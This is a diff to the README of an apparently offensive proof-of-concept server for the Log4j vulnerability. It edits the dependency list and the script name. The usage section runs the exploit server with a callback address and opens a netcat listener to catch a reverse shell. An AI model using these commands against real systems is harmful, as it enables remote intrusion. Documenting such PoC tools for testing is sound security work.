@@ -12,7 +12,8 @@ l4j_server is a lightweight, standalone server to be used a POC for the L4J vuln
 
 
 ## Dependencies
- pip install pwntools
+- [pwntools](https://pypi.org/project/pwntools/)
+- [This project runs best on Kali OS](https://www.kali.org/)
 
 
 ## Installation
@@ -33,7 +34,7 @@ tar -xvf jdk-8u202-linux-x64.tar.gz
 
 ## Usage
 ```
-python3 log4j_Server.py <callback_ip:callback_port> <HTTP_server_port>
+python3 l4j_server.py <callback_ip:callback_port> <HTTP_server_port>
 
 nc -lnvp <callback_port>
 
